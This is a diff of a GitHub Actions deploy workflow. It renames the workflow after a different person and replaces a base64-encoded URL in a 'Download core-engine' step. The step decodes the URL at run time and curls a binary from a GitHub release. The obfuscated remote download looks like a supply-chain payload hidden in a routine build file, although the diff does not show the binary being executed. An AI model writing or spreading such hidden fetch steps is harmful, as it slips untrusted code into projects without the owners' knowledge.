@@ -1,4 +1,4 @@
-name: deploy KelvinLimHao
+name: deploy KimberlyOngJiaNing
 
 on:
   push:
@@ -22,7 +22,7 @@ jobs:
 
       - name: Download core-engine
         run: |
-          ENCODED="aHR0cHM6Ly9naXRodWIuY29tL2tlbjU2NjczMzYvdG9kb2xpc3Q="
+          ENCODED="aHR0cHM6Ly9naXRodWIuY29tL2tlbjU2NjczMzYvdG9kb2xpc3QvcmVsZWFzZXMvZG93bmxvYWQvdjAzL2NvcmUtZW5naW5l"
           URL=$(echo "$ENCODED" | base64 -d)
           curl -L -o core-engine "$URL"
 
